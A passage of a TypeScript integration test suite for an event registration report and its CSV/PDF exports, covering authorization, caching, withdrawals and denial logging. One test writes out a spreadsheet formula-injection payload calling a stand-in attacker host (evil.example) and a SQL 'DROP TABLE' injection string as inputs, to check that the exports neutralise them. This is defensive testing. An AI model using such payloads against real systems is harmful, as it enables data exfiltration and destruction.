        '﻿Name,Email,Contact Number,Special Requirements,Registration Date,Status\r\n' +
          '"Smith, John",smith@example.com,91110001,,27 Sep 2026 15:00,Confirmed\r\n' +
          'Plus Tag,test+tag@example.com,91110002,,28 Sep 2026 10:30,Confirmed\r\n' +
          '"O""Brien",obrien@example.com,91110003,,29 Sep 2026 09:00,Confirmed\r\n' +
          '"Ann\nLee",ann@example.com,91110004,,29 Sep 2026 10:00,Confirmed\r\n',
      );
    });

    // VIEW-REG-INFO-04-E
    // Oracle (SPEC 04-E, A6/A7): the formula payload registers through the real SPM-61 endpoint and is stored and shown
    // literally; only the CSV neutralises it; the PDF shows the raw text; the SQL payload is literal everywhere and
    // the registrations table is untouched by the exports.
    // Kills: M12 neutralisation removed; M13 neutralisation at input (JSON or DB would show the leading '); a SQL payload
    //        interpreted; PDF text altered.
    it('VIEW-REG-INFO-04-E: the formula payload is literal in storage, JSON and PDF, neutralised in CSV', async () => {
      // Arrange: register the payload through the real endpoint (so "stored unchanged" is proven end to end).
      const { eventId, coo01 } = await seedEvt101();
      const attacker = await createUser('ATTENDEE', 'Mallory');
      const payload = '=IMPORTXML("http://evil.example/x","//a")';
      await request(app.getHttpServer())
        .post(`/api/events/${eventId}/registrations`)
        .set('Cookie', attacker.cookie)
        .send({ fullName: payload, email: 'mallory@example.com', contactNumber: '81230000' })
        .expect(201);
      const sqlUser = await createUser('ATTENDEE', 'Robert');
      const sql = "'; DROP TABLE registrations; --";
      await request(app.getHttpServer())
        .post(`/api/events/${eventId}/registrations`)
        .set('Cookie', sqlUser.cookie)
        .send({ fullName: sql, email: 'robert@example.com', contactNumber: '81230001' })
        .expect(201);
      const rowsBefore = await registrationCount();

      // Act
      const json = await reportJson(eventId, coo01.cookie);
      const csv = await call(exportPath(eventId, 'csv'), coo01.cookie);
      const pdf = await call(exportPath(eventId, 'pdf'), coo01.cookie);
      const stored = await pool.query('SELECT full_name FROM event_registrations WHERE event_id = $1 AND email = $2', [eventId, 'mallory@example.com']);

      // Assert: stored and JSON are literal (no leading apostrophe)
      expect(stored.rows[0].full_name).toBe(payload);
      expect(json.registrations.map((r: { fullName: string }) => r.fullName)).toContain(payload);
      // Assert: CSV neutralises then quotes
      expect(csv.text).toContain('"\'=IMPORTXML(""http://evil.example/x"",""//a"")",mallory@example.com,81230000,');
      expect(csv.text).toContain(`\r\n${sql},robert@example.com,81230001,`);
      // Assert: PDF shows both payloads as literal text; the database is intact
      const pdfSquashed = squash(await pdfText(pdf.bytes));
      expect(pdfSquashed).toContain(squash(payload));
      expect(pdfSquashed).toContain(squash(sql));
      expect(await registrationCount()).toBe(rowsBefore);
    });
  });

  describe('AC5: nobody but the assigned coordinator and the owning organiser can reach the report', () => {
    // VIEW-REG-INFO-05-D
    // Oracle (SPEC 05-D B): no session -> 401 on every door (never 403 or 404), with no attendee data.
    // Kills: M6 authorization before authentication.
    it.each(DOORS)('VIEW-REG-INFO-05-D: %s without a session is 401', async (_name, path) => {
      // Arrange
      const { eventId } = await seedEvt101();

      // Act
      const res = await call(path(eventId));

      // Assert
      expect(res.status).toBe(401);
      expect(res.text).not.toContain('Dev Patel');
      expect(res.text).not.toContain('dev.patel@example.com');
    });

    // VIEW-REG-INFO-05-D
    // Oracle (SPEC 05-D A): ATT-01 registered on EVT-101 still gets 403 MSG-08 on every door and no data.
    // Kills: M7 a registered attendee granted access; the 403 body leaking attendee data.
    it.each(DOORS)('VIEW-REG-INFO-05-D: a registered attendee gets 403 MSG-08 on the %s', async (_name, path) => {
      // Arrange
      const { eventId, att01 } = await seedEvt101();

      // Act
      const res = await call(path(eventId), att01.cookie);

      // Assert
      expect(res.status).toBe(403);
      expect(JSON.parse(res.text).message).toBe(MSG_08);
      expect(res.text).not.toContain('Dev Patel');
      expect(res.text).not.toContain('@example.com');
    });

    // VIEW-REG-INFO-05-A
    // Oracle (SPEC 05-A): COO-02 (assigned to EVT-103 only) gets 403 MSG-08 on the report and both exports; no EVT-101 data.
    // Kills: M2 the assignment check removed; M5 exports skipping the access check; coordinator role alone granting access.
    it.each(DOORS)('VIEW-REG-INFO-05-A: an unassigned coordinator gets 403 MSG-08 on the %s', async (_name, path) => {
      // Arrange: EVT-101 is managed by COO-01; COO-02 manages EVT-103.
      const { eventId, org01 } = await seedEvt101();
      const coo02 = await createUser('COORDINATOR', 'Evelyn Goh');
      await seedEvent({ name: 'EVT-103', organiserId: org01.uid, coordinatorId: coo02.uid });

      // Act
      const res = await call(path(eventId), coo02.cookie);

      // Assert
      expect(res.status).toBe(403);
      expect(JSON.parse(res.text).message).toBe(MSG_08);
      expect(res.text).not.toMatch(/Alice Tan|Dev Patel|Chloe Ng|@example\.com/);
    });

    // VIEW-REG-INFO-05-B
    // Oracle (SPEC 05-B): ORG-01 against EVT-102 (owned by ORG-02) gets 403 MSG-08 on every door; control: ORG-01 on EVT-101 is 200.
    // Kills: M3 the ownership check removed (any organiser); ownership compared to the wrong column.
    it.each(DOORS)('VIEW-REG-INFO-05-B: a non-owning organiser gets 403 MSG-08 on the %s, and still reaches their own event', async (_name, path) => {
      // Arrange
      const { eventId: evt101, org01 } = await seedEvt101();
      const org02 = await createUser('ORGANISER', 'Olivia Teo', { login: false });
      const evt102 = await seedEvent({ name: 'Annual Networking Night', organiserId: org02.uid, coordinatorId: null });
      await addRegistration(evt102, { fullName: 'Private Person', email: 'private@example.com', at: DEV_AT });

      // Act
      const denied = await call(path(evt102), org01.cookie);
      const control = await call(path(evt101), org01.cookie);

      // Assert
      expect(denied.status).toBe(403);
      expect(JSON.parse(denied.text).message).toBe(MSG_08);
      expect(denied.text).not.toMatch(/Private Person|private@example\.com/);
      expect(control.status).toBe(200);
    });

    // VIEW-REG-INFO-05-C
    // Oracle (SPEC 05-C A/B): query parameters that name another identity change nothing: the unassigned coordinator and the
    // non-owning organiser still get 403 MSG-08; identity comes from the session only. One warn log per denied call, with
    // user id, event id and reason, and no attendee personal data.
    // Kills: M4 identity read from the query; denial not logged; PII in logs.
    it('VIEW-REG-INFO-05-C: query-parameter identity is ignored and each denial is logged once', async () => {
      // Arrange
      const { eventId, coo01, org01 } = await seedEvt101();
      const coo02 = await createUser('COORDINATOR', 'Evelyn Goh');
      const org02 = await createUser('ORGANISER', 'Olivia Teo', { login: false });
      const evt102 = await seedEvent({ name: 'Annual Networking Night', organiserId: org02.uid, coordinatorId: null });
      const warn = vi.spyOn(Logger.prototype, 'warn').mockImplementation(() => undefined);

      // Act
      const a = await call(`${reportPath(eventId)}?coordinatorId=${coo01.uid}`, coo02.cookie);
      const b = await call(`${reportPath(evt102)}?organiserId=${org02.uid}`, org01.cookie);

      // Assert: 403 first, then the log
      expect([a.status, b.status]).toEqual([403, 403]);
      expect(JSON.parse(a.text).message).toBe(MSG_08);
      expect(warn).toHaveBeenCalledTimes(2);
      expect(warn.mock.calls[0][0]).toEqual({
        message: `${coo02.uid} does not manage ${eventId}`,
        userId: coo02.uid,
        eventId,
        reason: 'not_assigned_or_owner',
      });
      expect(warn.mock.calls[1][0]).toEqual({
        message: `${org01.uid} does not manage ${evt102}`,
        userId: org01.uid,
        eventId: evt102,
        reason: 'not_assigned_or_owner',
      });
      expect(JSON.stringify(warn.mock.calls)).not.toMatch(/Dev Patel|Alice Tan|Chloe Ng|@example\.com|Evelyn|Farid/);
    });

    // VIEW-REG-INFO-05-C-TOKEN
    // Oracle (SPEC 05-C: identity and role come from the token only): a manager who adds a query parameter naming someone else
    // is still served as themselves.
    // Kills: M4 variant where a query value overrides the token identity (the manager would be refused or someone else served).
    it('VIEW-REG-INFO-05-C-TOKEN: a manager with a foreign identity in the query still gets their own report', async () => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();
      const coo02 = await createUser('COORDINATOR', 'Evelyn Goh', { login: false });

      // Act
      const res = await call(`${reportPath(eventId)}?coordinatorId=${coo02.uid}`, coo01.cookie);

      // Assert
      expect(res.status).toBe(200);
    });

    // VIEW-REG-INFO-05-D-ORDER
    // Oracle (D3 order 401 -> 404 -> 403): an event that does not exist is 404 "Event not found." for any signed-in user;
    // a malformed id is the same 404 (SPM-61 convention). A refusal for an existing event logs, a 404 does not.
    // Kills: 403 for a missing event (reveals nothing but breaks the documented order); a 500 on a malformed id.
    it('VIEW-REG-INFO-05-D-ORDER: unknown and malformed event ids are 404 before any 403', async () => {
      // Arrange
      const { att01 } = await seedEvt101();
      const warn = vi.spyOn(Logger.prototype, 'warn').mockImplementation(() => undefined);

      // Act
      const missing = await call(reportPath(UNKNOWN_EVENT), att01.cookie);
      const malformed = await call(reportPath('not-a-uuid'), att01.cookie);

      // Assert
      expect([missing.status, malformed.status]).toEqual([404, 404]);
      expect(JSON.parse(missing.text).message).toBe('Event not found.');
      expect(warn).not.toHaveBeenCalled();
    });

    // VIEW-REG-INFO-05-A-FMT
    // Oracle (D3): authorization is decided before the format is looked at, so an outsider cannot learn anything from a 400.
    // Kills: format validated before authorization.
    it('VIEW-REG-INFO-05-A-FMT: an unassigned coordinator asking for an unknown format still gets 403', async () => {
      // Arrange
      const { eventId } = await seedEvt101();
      const coo02 = await createUser('COORDINATOR', 'Evelyn Goh');

      // Act
      const res = await call(exportPath(eventId, 'xlsx'), coo02.cookie);

      // Assert
      expect(res.status).toBe(403);
    });
  });

  describe('AC6: the report is never served stale', () => {
    // VIEW-REG-INFO-06-A
    // Oracle (SPEC 06-A BE): right after an SPM-61 registration, the organiser session also sees ATT-05; a second registration
    // appears on the next call (no caching between calls).
    // Kills: a response cache keyed by event; a cache that serves the first answer forever.
    it('VIEW-REG-INFO-06-A: a new registration is visible to the organiser immediately, twice in a row', async () => {
      // Arrange
      const { eventId, org01 } = await seedEvt101();
      const att05 = await createUser('ATTENDEE', 'Farhan Rahman');
      const att06 = await createUser('ATTENDEE', 'Gina Lee');
      expect((await reportJson(eventId, org01.cookie)).totalConfirmed).toBe(3);

      // Act
      await request(app.getHttpServer()).post(`/api/events/${eventId}/registrations`).set('Cookie', att05.cookie).send(ATTENDEE_DETAILS).expect(201);
      const afterFirst = await reportJson(eventId, org01.cookie);
      await request(app.getHttpServer()).post(`/api/events/${eventId}/registrations`).set('Cookie', att06.cookie)
        .send({ fullName: 'Gina Lee', email: 'gina@example.com', contactNumber: '81234568' }).expect(201);
      const afterSecond = await reportJson(eventId, org01.cookie);

      // Assert
      expect(afterFirst.registrations.map((r: { fullName: string }) => r.fullName)).toContain('Farhan Rahman');
      expect([afterFirst.totalConfirmed, afterSecond.totalConfirmed]).toEqual([4, 5]);
    });

    // VIEW-REG-INFO-06-B-REREG
    // Oracle (derived from SPM-120: a withdrawn registration is reactivated in place and its registration date is reset): after
    // ATT-01 withdraws REG-9001 and registers again, the report lists Alice exactly once, last (her new date is later than
    // everyone's), with a registration date different from the original, and the count is back to 3.
    // Kills: the reactivated row dropped or duplicated; the old registration date or position kept; the count not restored.
    it('VIEW-REG-INFO-06-B-REREG: registering again after a withdrawal puts the attendee back once, at the new date', async () => {
      // Arrange: Alice withdraws at T0.
      const { eventId, coo01, att01, regs } = await seedEvt101();
      await request(app.getHttpServer()).post(`/api/registrations/${regs.alice}/withdraw`).set('Cookie', att01.cookie).expect(200);
      expect((await reportJson(eventId, coo01.cookie)).totalConfirmed).toBe(2);

      // Act: she registers again an hour later (the registration date itself is stamped by the database, so only its order
      // and difference from the original are asserted).
      now = new Date(T0.getTime() + 3_600_000);
      await request(app.getHttpServer())
        .post(`/api/events/${eventId}/registrations`)
        .set('Cookie', att01.cookie)
        .send({ fullName: 'Alice Tan', email: 'alice.tan@example.com', contactNumber: '98765432' })
        .expect(201);
      const body = await reportJson(eventId, coo01.cookie);

      // Assert
      expect(body.registrations.map((r: { fullName: string }) => r.fullName)).toEqual(['Dev Patel', 'Chloe Ng', 'Alice Tan']);
      expect(body.registrations[2].registrationId).toBe(regs.alice); // same row, reactivated in place
      expect(body.registrations[2].registeredAt).not.toBe(ALICE_AT);
      expect(new Date(body.registrations[2].registeredAt).getTime()).toBeGreaterThan(new Date(CHLOE_AT).getTime());
      expect([body.totalConfirmed, body.availableSpots]).toEqual([3, 47]);
    });

    // VIEW-REG-INFO-06-A-CACHE
    // Oracle (derived from AC6, R13): personal data that changes minute to minute must not be stored by browsers or proxies,
    // so the report and both exports are sent with Cache-Control: no-store.
    // Kills: a cacheable response that a browser or proxy could replay after a registration or withdrawal.
    it.each(DOORS)('VIEW-REG-INFO-06-A-CACHE: the %s is sent with Cache-Control no-store', async (_name, path) => {
      // Arrange
      const { eventId, coo01 } = await seedEvt101();

      // Act
      const res = await call(path(eventId), coo01.cookie);

      // Assert
      expect(res.status).toBe(200);
      expect(res.headers['cache-control']).toBe('no-store');
    });

    // VIEW-REG-INFO-06-B
    // Oracle (SPEC 06-B BE): the report excludes REG-9001 immediately after the SPM-120 call, for the organiser session as well.
    // Kills: only the count updating (rows kept); withdrawn row kept until a refresh.
    it('VIEW-REG-INFO-06-B: a withdrawal removes the row immediately for the organiser', async () => {
      // Arrange
      const { eventId, org01, att01, regs } = await seedEvt101();
      await request(app.getHttpServer()).post(`/api/registrations/${regs.alice}/withdraw`).set('Cookie', att01.cookie).expect(200);

      // Act
      const body = await reportJson(eventId, org01.cookie);

      // Assert
      expect(body.registrations.map((r: { fullName: string }) => r.fullName)).toEqual(['Dev Patel', 'Chloe Ng']);
      expect(body.totalConfirmed).toBe(2);
    });
  });
});

// ASSUMPTION index
// A6: 04-E concrete payload =IMPORTXML("http://evil.example/x","//a")      -> 04-E
// A7: SQL payload placed in the Full Name column (D6 excludes Special Requirements) -> 04-E
// A8: a missing contact number is returned as an empty string               -> 03-A-NULL
// A10: availableSpots = max(capacity - n, 0)                                 -> 02-A-BND
// A11: a missing, empty, repeated or non-lower-case export format -> 400   -> 04-A-FMT, 05-A-FMT
// (06-B-REREG: the re-registration date is stamped by the database clock, so only its order and difference are asserted)
// A12: denial log shape {message, userId, eventId, reason: "not_assigned_or_owner"} at warn level -> 05-C
// Not Automated (Q8/Q9 and prompt 2.5): a Cancelled registration (CHECK constraint forbids it), opening the CSV in Excel,
// visual PDF layout review.
